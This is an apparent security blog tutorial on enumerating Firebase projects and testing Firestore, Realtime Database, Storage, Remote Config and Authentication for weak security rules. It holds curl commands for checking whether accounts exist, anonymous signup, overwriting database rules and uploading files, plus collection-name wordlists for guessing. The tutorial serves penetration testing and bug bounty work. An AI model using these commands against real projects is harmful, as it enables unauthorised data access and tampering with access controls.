+++
title = "Hacking Firebase Projects: Enumeration and Common Misconfigurations"
date = "2025-07-18"
[ author ]
  name = "m1tz"
+++

After encountering multiple Firebase-related security issues through professional assessments at work and bug bounty hunting, I felt it was important to bring more visibility to the security implications within the Firebase ecosystem. Firebase is a popular Backend-as-a-Service (BaaS) platform provided by Google, offering developers a wide range of tools like Firestore, Realtime Database, Cloud Storage, and Authentication. Under the hood, every Firebase project is backed by a standard Google Cloud Platform (GCP) project, meaning that many GCP APIs and configurations can be used or misused if misconfigured.

In this post, we explore how to enumerate Firebase projects, extract sensitive project data, and identify common security misconfigurations in real-world apps across mobile and web environments. We'll cover some general information about Google Firebase, discover some project-related enumeration techniques and cover the attack surface of Firestore, Realtime Database, Firebase Storage, Remote Config, and Authentication.

## Firebase Project Enumeration
First, we need to cover how to locate Firebase configs in apps. All apps (both mobile and web) must include a config object, often inlined in JS bundles or mobile assets:
```json
{
  "apiKey": "AIzaSyD...LPFI",
  "authDomain": "example-project.firebaseapp.com",
  "databaseURL": "https://example-project.firebaseio.com",
  "projectId": "example-project",
  "storageBucket": "example-project.appspot.com",
  "messagingSenderId": "928497342409",
  "appId": "1:928497342409:web:abcdef123456"
}
```

Use grep or strings to locate Firebase config:

- **Android** - either located in `resources/res/values/strings.xml` or in the `resources/AndroidManifest.xml`

- **JS bundles** - can be anywhere, thus `grep -rniE 'firebase.*(apiKey|projectId)' .`


Now with Firebase configurations found, these have to be validated. The `projectId` is central to most Firebase APIs.
If the `appId` doesn't match the project, some APIs (like *Remote Config*) will not work and return:
```json
{
  "error": {
    "message": "AppId '<appid>' does not match specified project 'projects/1234456456767'",
    "status": "PERMISSION_DENIED"
 }
}
```

**Project Insights**
More insights into a project can be gained through the following endpoint. Authorized Domains can be very useful for referer and origin checks that might be implemented within the Firebase project. Also, this lists associated domains that might be worth exploring.
```bash
$ curl https://identitytoolkit.googleapis.com/v1/projects?key=<apiKey>
  
{
  "projectId": "1234456456767",
  "authorizedDomains": [
    "localhost",
    "example.com"
 [...]
```

**User Enumeration**
Firebase provides a way to check whether an email exists in a project:
```bash
$ curl -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<apiKey>' \
  -H 'Content-Type: application/json' \
  -d '{
    "identifier": "user@example.com",
    "continueUri": "http://localhost"
  }'
```

**Missing Pieces**
If you got the `appId` and the `apiKey` from requests but you are missing the other configuration fields, shoot a HTTP request to 
```
https://firebase.googleapis.com/v1alpha/projects/-/apps/1:<senderId>:web:<uniqueId>/webConfig
```
with the header `x-goog-api-key: <pieKey>` and obtain the missing pieces.


## API Key and Project Restrictions

Many Firebase APIs rely solely on the `apiKey` and matching configuration values such as `projectId` or `appId`, which are usually available to everyone (this is how Firebase works). But Google also allows developers to restrict the usage via different strategies:

- **Referer-based restrictions (Web)** - have the correct referer set to bypass this restriction
- **AppCheck token restrictions (JWT)** - which is often exchanged in websockets or somewhere during communication of the app, dynamically. The format looks like: `X-Firebase-AppCheck: <JWT>`.
- **SHA1 Certificate Hash restrictions (Android)** - which is hard to get right, at least I hadn't had luck with. Example SHA1 certificate hash `unzip -p app.apk "META-INF/*.RSA" | openssl pkcs7 -inform DER -print_certs | openssl x509 -noout -fingerprint -sha1`. Verification whether valid for the current project can be done at `curl https://identitytoolkit.googleapis.com/v1/projects?key=<apiKey>&sha1Cert=<cert>`.


## Firebase Authentication

When Firebase projects include authentication (Google, Facebook, email/password, email-link, or anonymous), there's often a high success rate in gaining access, because many developers misconfigure the rules for authenticated users. This theoretically shifts a broken access control that happens from no authentication to an authorization issue. Firebase relies heavily on security rules to restrict access to Firestore, Realtime Database, Cloud Storage, and other services. However, cnce a user is authenticated and has an `idToken`, they may bypass the default unauthenticated restrictions. Examples of different sign-up mechanisms are demonstrated below:

1. Sign up anonymously:
```bash
$ curl -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"returnSecureToken":true}'
```

2. Sign up with email and password:
```bash
$ curl -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>' \
  -H 'Content-Type: application/json' \
  --data '{"email":"anon@demo.com","password":"Password123!","returnSecureToken":true}'
```

3. Sign up with email-link. The `continueURL` and the `returnURL` might be limited to domains that are allow-listed (see `authorizedDomains` from above):
```bash
$ curl -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<apiKey>' \
  -H 'Content-Type: application/json' \
  --data '{
    "requestType": "EMAIL_SIGNIN",
    "email": "anon@demo.com",
    "continueUrl": "<url_allow_listed>"
  }'
```

The received email link looks something like this:

```
https://www.example.com/__/auth/action?mode=signIn&oobCode=AbCdEfG123&apiKey=AIza...&lang=en
```

and can be exchanged for an `authToken` with the following request:

```bash
$ curl -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithEmailLink?key=<apiKey>' \
  -H 'Content-Type: application/json' \
  --data '{
    "email": "anon@demo.com",
    "oobCode": "<OOB_CODE>",
    "returnSecureToken": true,
    "tenantId": "optional"
  }'
```

4. Authentication request example with OAuth:
```bash
$ curl 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=<apiKey>' \
  -H 'Content-Type: application/json' \
  --data '{"postBody":"access_token=<FB_TOKEN>&providerId=facebook.com","requestUri":"http://localhost","returnSecureToken":true}'
```

## Firestore Misconfigurations

Let me introduce Firestore, a document-based NoSQL database where data is stored as documents in so-called *collections*. It’s designed to work with fine-grained [Security Rules](https://firebase.google.com/docs/firestore/security/get-started) that control document-level access. As already mentioned, most misconfigurations occur when a Firebase session can be established and Firestore testing can be done in an authenticated context. However, it often strongly depends on which data is stored within Firestore. If there is data that should be accessible to everyone a security rule like the following will not be a vulnerability at all:

```
service cloud.firestore {
 match /databases/{database}/documents {
 match /some_collection/{document} {
 allow read, write: if request.auth != null;
 } } }
```
**Note**: If any rule evaluates to `true` for a request, access is **granted**, even if other rules for the same path return `false`. This is where misconfigurations are happening.

Think of accounts, the situation could be different if accounts and their attributes are stored in a collection called `users`. User A should not be able to read or write data of user B, and vice versa. It is a good starting point if tests are conducted without authentication at all - however, if signup is available, do not hesitate to go one step further.


A URL to the Firebase database and its collections/documents looks like this:
```
https://firestore.googleapis.com/v1/projects/<projectId>/databases/<database>/documents/<collection>/<document>
```
Some Firebase projects enable read access to the whole database and expose their internal structure, but on the other hand there are projects that are not verbose and only allow requests to documents with the exact path. Thankfully, existing databases can be checked with a neat trick. If the response does not end in a status code of `404` or the response contains a `Service_DISABLED` (which speaks for the whole Firestore), a database exists, and collections can be guessed. You get a feeling for well-known databases and collections after a while (a document is usually a unique identifier). To give you a quick start into this, I will share my well-known values that I have collected over time.

**Databases**
```
(default)     prod  
mydatabase    productio  
database      staging  
dev           qa  
db            test  
app           main  
master        customers  
tenant        
```

**Collections**
```
tenants             login               roles              messages             schedules  
allocations         logins              passwords          contacts             appointments  
approvalgroups      media               routes             calls                applications  
assets              payroll             sample             projects             temporaryApplication  
authTokens          payrolls            staff              tasks                support  
calendar            registrations       title              milestones           invoices  
calendars           reporting           titles             teams                transactions  
management          reports             user               invitations          wishlists  
cost-centres        group               users              settings             addresses  
costcentres         groups              tokens             logs                 shipments  
customers           images              data               events               coupons  
dashboard           installations       sessions           subscriptions        favorites  
divisions           login               accounts           features             permissions  
documents           logins              notifications      analytics            schedules  
employees           media               products           files                appointments  
group               payroll             categories         folders              applications  
groups              payrolls            orders             activities           temporaryApplication  
images              registrations       cartItems          chats                  
installations       reporting           reviews            chat           
```

## Realtime Database Misconfigurations

The Realtime Database (*RTDB*) of Firebase is a NoSQL database as well, but simpler and comes along with low-latency for applications that require real-time data synchronization. It is also seen as the legacy product and thus not as common as Firestore. The RTDB is accessible via two different domains:
```
https://<project>.firebaseio.com/.json
https://<project>.<region>.firebasedatabase.app/.json
```

Of which the following regions are available:
```
us-central1.firebasedatabase.app
europe-west1.firebasedatabase.app
asia-southeast1.firebasedatabase.ap
```


Again, security rules can be defined and are used to differentiate access for different users. To avoid duplication, this topic is not covered again. Contrary to the other products, security rules can be managed via the [REST API](https://firebase.google.com/docs/reference/rest/database/#section-security-rules), which opens up a new attack surface. Users with a session are able to pass their `idToken` to the requests and read or write security rules (if improperly configured):

```bash
$ curl 'https://<projectId>.firebaseio.com/.settings/rules.json?auth=<idToken>'
$ curl -X PUT -d '{ "rules": { ".read": true } }' 'https://<projectId>.firebaseio.com/.settings/rules.json?auth=<idToken>'
```


Whether access to the RTDB is possible can be identified with a request to the webroot of the following URL:

```bash
$ curl https://<projectId>.firebaseio.com/.json
```


## Cloud Storage Misconfigurations

Firebase Cloud Storage is Google's blob storage that can be used in the Firebase ecosystem as well. Again, to avoid duplications, the security is strongly tied to what is present within the blob storage and what the [security rules](https://firebase.google.com/docs/storage/security) looks like.

By default, Firebase apps come with a cloud bucket that is hosted at `<projectId>.appspot.com` (until 2024) and `<projectId>.firebasestorage.app`. Public access can be checked by simply querying the bucket root in the following way:

```bash
$ curl https://firebasestorage.googleapis.com/v1/b/<projectId>.appspot.com/o?maxResults=100
$ curl https://firebasestorage.googleapis.com/v1/b/<projectId>.appspot.com/o?prefix=files%2F&maxResults=100
```

Write access and thus upload of files can be check very similar:

```bash
$ curl -X POST 'https://firebasestorage.googleapis.com/v1/b/<projectId>.appspot.com/o?name=poc.txt' --data 'Hello Firebase'
```

Besides authorization issues that occur when tested with the obtained session against Firebase, this cloud storage can also suffer from missing authentication checks at all open blob storage.


## Remote Config Misconfigurations

Firebase projects are often used in mobile environments where frequent app updates are impractical. [Remote Config](https://firebase.google.com/docs/remote-config) enables developers to remotely control app behavior by storing configuration parameters on the server. This remote configuration might contain sensitive information such as feature flags, environment toggles, or even hardcoded secrets, which are intended for internal use only and get exposed when Remote Config is retrieved.

The `appInstanceId` has to match, but is commonly accepted with values such as `PROD` or `1`:
```bash
curl -X POST \
 "https://firebaseremoteconfig.googleapis.com/v1/projects/<projectId>/namespaces/firebase:fetch?key=<apiKey>" \
  -H 'Content-Type: application/json' \
 --data '{"appId":"<appId>","appInstanceId":"PROD"}'
```

If you see a 403 or AppId mismatch, try guessing the `appId` or inspecting the corresponding apps.


## Conclusion

Firebase is a powerful backend platform, but the default configurations are often too permissive, especially during development. By extracting Firebase config files, enumerating services with `apiKey` and `projectId`, and probing for weak security rules, attackers can gain unintended access to sensitive data or modify stored data.

**Checklist for Secure Firebase Projects**
- Use strict Firestore, Realtime DB, and Cloud Storage security rules
- Restrict apiKey usage by SHA1 fingerprint and Referer headers
- Enforce AppCheck where supported
- Always remove dev rules before going live


## References
- https://blog.assetnote.io/bug-bounty/2020/02/02/expanding-attack-surface-react-native/
- https://firebase.google.com/docs/database/security
- https://www.ghostlulz.com/blog/google-exposed-firebase-database
- https://medium.com/@S3THU/exploiting-firestore-database-rules-a-pathway-to-data-breaches-aa945476cc16
- https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty
- https://blog.deesee.xyz/android/automation/2019/08/03/firebase-remote-config-dump.html


**Special thanks** to [@TightropeMonkey](https://x.com/TightropeMonkey) for proofreading